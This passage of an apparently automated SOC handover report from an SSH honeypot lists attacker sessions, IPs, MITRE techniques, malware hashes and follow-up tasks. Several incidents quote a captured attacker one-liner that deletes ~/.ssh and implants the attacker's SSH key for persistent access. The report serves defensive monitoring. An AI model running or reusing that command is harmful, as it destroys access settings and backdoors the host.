| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:17:27` | `cowrie.session.connect` |
| `2026-05-14 12:17:27` | `cowrie.client.version` |
| `2026-05-14 12:17:27` | `cowrie.client.kex` |
| `2026-05-14 12:17:28` | `cowrie.login.success` |
| `2026-05-14 12:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.108.48[.]228` to AbuseIPDB if not already reported
- [ ] Block `202.108.48[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bedb3a846f4

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-05-14 12:29 |
| **Last Seen** | 2026-05-14 12:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:29:59` | `cowrie.session.connect` |
| `2026-05-14 12:29:59` | `cowrie.client.version` |
| `2026-05-14 12:29:59` | `cowrie.client.kex` |
| `2026-05-14 12:30:00` | `cowrie.login.success` |
| `2026-05-14 12:30:01` | `cowrie.session.params` |
| `2026-05-14 12:30:01` | `cowrie.command.input` |
| `2026-05-14 12:30:01` | `cowrie.command.failed` |
| `2026-05-14 12:30:02` | `cowrie.log.closed` |
| `2026-05-14 12:30:02` | `cowrie.session.params` |
| `2026-05-14 12:30:02` | `cowrie.command.input` |
| `2026-05-14 12:30:02` | `cowrie.session.file_download` |
| `2026-05-14 12:30:02` | `cowrie.log.closed` |
| `2026-05-14 12:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6ef9f3263ab

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-05-14 12:30 |
| **Last Seen** | 2026-05-14 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:30:06` | `cowrie.session.connect` |
| `2026-05-14 12:30:06` | `cowrie.client.version` |
| `2026-05-14 12:30:06` | `cowrie.client.kex` |
| `2026-05-14 12:30:07` | `cowrie.login.success` |
| `2026-05-14 12:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eb772e301d6

| Field | Detail |
|---|---|
| **Source IP** | `181.0.214[.]136` |
| **First Seen** | 2026-05-14 12:39 |
| **Last Seen** | 2026-05-14 12:40 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:39:32` | `cowrie.session.connect` |
| `2026-05-14 12:39:32` | `cowrie.client.version` |
| `2026-05-14 12:39:33` | `cowrie.client.kex` |
| `2026-05-14 12:39:34` | `cowrie.login.success` |
| `2026-05-14 12:39:35` | `cowrie.session.params` |
| `2026-05-14 12:39:35` | `cowrie.command.input` |
| `2026-05-14 12:39:35` | `cowrie.command.failed` |
| `2026-05-14 12:39:36` | `cowrie.log.closed` |
| `2026-05-14 12:39:36` | `cowrie.session.params` |
| `2026-05-14 12:39:36` | `cowrie.command.input` |
| `2026-05-14 12:39:37` | `cowrie.session.file_download` |
| `2026-05-14 12:39:37` | `cowrie.log.closed` |
| `2026-05-14 12:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.0.214[.]136` to AbuseIPDB if not already reported
- [ ] Block `181.0.214[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13bceea41e6e

| Field | Detail |
|---|---|
| **Source IP** | `181.0.214[.]136` |
| **First Seen** | 2026-05-14 12:40 |
| **Last Seen** | 2026-05-14 12:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 12:40:00` | `cowrie.session.connect` |
| `2026-05-14 12:40:00` | `cowrie.client.version` |
| `2026-05-14 12:40:00` | `cowrie.client.kex` |
| `2026-05-14 12:40:02` | `cowrie.login.success` |
| `2026-05-14 12:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.0.214[.]136` to AbuseIPDB if not already reported
- [ ] Block `181.0.214[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac9682781f5b

| Field | Detail |
|---|---|
| **Source IP** | `51.77.158[.]34` |
| **First Seen** | 2026-05-14 14:15 |
| **Last Seen** | 2026-05-14 14:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 14:15:24` | `cowrie.session.connect` |
| `2026-05-14 14:15:24` | `cowrie.client.version` |
| `2026-05-14 14:15:25` | `cowrie.client.kex` |
| `2026-05-14 14:15:25` | `cowrie.login.success` |
| `2026-05-14 14:15:25` | `cowrie.session.params` |
| `2026-05-14 14:15:25` | `cowrie.command.input` |
| `2026-05-14 14:15:25` | `cowrie.command.failed` |
| `2026-05-14 14:15:26` | `cowrie.log.closed` |
| `2026-05-14 14:15:26` | `cowrie.session.params` |
| `2026-05-14 14:15:26` | `cowrie.command.input` |
| `2026-05-14 14:15:26` | `cowrie.session.file_download` |
| `2026-05-14 14:15:26` | `cowrie.log.closed` |
| `2026-05-14 14:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.158[.]34` to AbuseIPDB if not already reported
- [ ] Block `51.77.158[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bbba03dff40

| Field | Detail |
|---|---|
| **Source IP** | `51.77.158[.]34` |
| **First Seen** | 2026-05-14 14:15 |
| **Last Seen** | 2026-05-14 14:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 14:15:28` | `cowrie.session.connect` |
| `2026-05-14 14:15:28` | `cowrie.client.version` |
| `2026-05-14 14:15:28` | `cowrie.client.kex` |
| `2026-05-14 14:15:29` | `cowrie.login.success` |
| `2026-05-14 14:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.158[.]34` to AbuseIPDB if not already reported
- [ ] Block `51.77.158[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-440ba946e3ca

| Field | Detail |
|---|---|
| **Source IP** | `103.126.117[.]26` |
| **First Seen** | 2026-05-14 14:17 |
| **Last Seen** | 2026-05-14 14:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 14:17:13` | `cowrie.session.connect` |
| `2026-05-14 14:17:13` | `cowrie.client.version` |
| `2026-05-14 14:17:14` | `cowrie.client.kex` |
| `2026-05-14 14:17:14` | `cowrie.login.success` |
| `2026-05-14 14:17:14` | `cowrie.session.params` |
| `2026-05-14 14:17:14` | `cowrie.command.input` |
| `2026-05-14 14:17:14` | `cowrie.command.failed` |
| `2026-05-14 14:17:14` | `cowrie.log.closed` |
| `2026-05-14 14:17:14` | `cowrie.session.params` |
| `2026-05-14 14:17:14` | `cowrie.command.input` |
| `2026-05-14 14:17:14` | `cowrie.session.file_download` |
| `2026-05-14 14:17:14` | `cowrie.log.closed` |
| `2026-05-14 14:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.126.117[.]26` to AbuseIPDB if not already reported
- [ ] Block `103.126.117[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374f53e004c3

| Field | Detail |
|---|---|
| **Source IP** | `103.126.117[.]26` |
| **First Seen** | 2026-05-14 14:17 |
| **Last Seen** | 2026-05-14 14:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 14:17:16` | `cowrie.session.connect` |
| `2026-05-14 14:17:16` | `cowrie.client.version` |
| `2026-05-14 14:17:16` | `cowrie.client.kex` |
| `2026-05-14 14:17:16` | `cowrie.login.success` |
| `2026-05-14 14:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.126.117[.]26` to AbuseIPDB if not already reported
- [ ] Block `103.126.117[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.126.135[.]131` | **40** | 2026-05-14 11:50 | 2026-05-14 11:57 | 48m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `159.203.20[.]239` | **9** | 2026-05-14 12:35 | 2026-05-14 14:16 | 3m | 0 | `T1592` | 🟢 LOW |
| `45.249.247[.]165` | **5** | 2026-05-14 11:58 | 2026-05-14 12:09 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `47.108.129[.]145` | **5** | 2026-05-14 10:36 | 2026-05-14 12:49 | 3m | 0 | `T1592` | 🟢 LOW |
| `101.96.200[.]105` | **2** | 2026-05-14 13:23 | 2026-05-14 13:24 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-05-14 12:25 | 2026-05-14 12:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.96.179[.]87` | **2** | 2026-05-14 11:47 | 2026-05-14 11:48 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `5.101.64[.]6` | **2** | 2026-05-14 10:30 | 2026-05-14 10:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `51.199.9[.]213` | **2** | 2026-05-14 11:35 | 2026-05-14 11:37 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]88` | **2** | 2026-05-14 13:31 | 2026-05-14 13:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.141[.]34` | 1 | 2026-05-14 14:14 | 2026-05-14 14:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.126.117[.]26` | 1 | 2026-05-14 14:17 | 2026-05-14 14:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.229.9[.]97` | 1 | 2026-05-14 12:01 | 2026-05-14 12:01 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]117` | 1 | 2026-05-14 12:35 | 2026-05-14 12:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.78.193[.]4` | 1 | 2026-05-14 13:52 | 2026-05-14 13:53 | 13s | 0 | `T1592` | 🟢 LOW |
| `179.33.186[.]150` | 1 | 2026-05-14 12:30 | 2026-05-14 12:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.96.190[.]108` | 1 | 2026-05-14 13:32 | 2026-05-14 13:32 | 31s | 0 | `T1592` | 🟢 LOW |
| `180.76.172[.]156` | 1 | 2026-05-14 12:00 | 2026-05-14 12:01 | 48s | 0 | `T1592` | 🟢 LOW |
| `193.24.211[.]100` | 1 | 2026-05-14 14:04 | 2026-05-14 14:04 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `202.108.48[.]228` | 1 | 2026-05-14 12:17 | 2026-05-14 12:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.78.60[.]105` | 1 | 2026-05-14 11:54 | 2026-05-14 11:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.247.218[.]112` | 1 | 2026-05-14 12:32 | 2026-05-14 12:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-05-14 11:45 | 2026-05-14 11:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.83.53[.]90` | 1 | 2026-05-14 12:56 | 2026-05-14 12:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.14.254[.]104` | 1 | 2026-05-14 12:02 | 2026-05-14 12:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.238.165[.]84` | 1 | 2026-05-14 11:14 | 2026-05-14 11:14 | 12s | 0 | `T1592` | 🟢 LOW |
| `39.96.198[.]211` | 1 | 2026-05-14 12:08 | 2026-05-14 12:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `39.97.39[.]139` | 1 | 2026-05-14 10:49 | 2026-05-14 10:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.226.140[.]120` | 1 | 2026-05-14 12:02 | 2026-05-14 12:02 | 1s | 0 | `T1592` | 🟢 LOW |
| `51.77.158[.]34` | 1 | 2026-05-14 14:15 | 2026-05-14 14:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.28.152[.]228` | 1 | 2026-05-14 11:09 | 2026-05-14 11:09 | 12s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]163` | 1 | 2026-05-14 11:28 | 2026-05-14 11:28 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `47.108.129[.]145` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 8 |
| `5.226.140[.]120` | GB | Infrawatch Limited | **100** ⚠️ | 3 |
| `39.96.198[.]211` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 3 |
| `121.229.9[.]97` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `5.101.64[.]6` | RU | public vlans of DC | **100** ⚠️ | 50 |
| `69.5.169[.]163` | DE | Infrawatch Limited | **100** ⚠️ | 1 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `193.24.211[.]100` | BG | Layer7 Networks GmbH | **100** ⚠️ | 12 |
| `3.129.187[.]38` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `51.77.158[.]34` | FR | OVH SAS | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 68 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 19 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 19 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 10 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 23 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 139 cases |
| Tool 34  | Credential Extractor        | ✅ 38 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 43 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (19.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 32 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 19 priority case(s) shown individually · 32 recon entry/entries in table (10 group(s) consolidating 71 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-14T14:23:59Z_
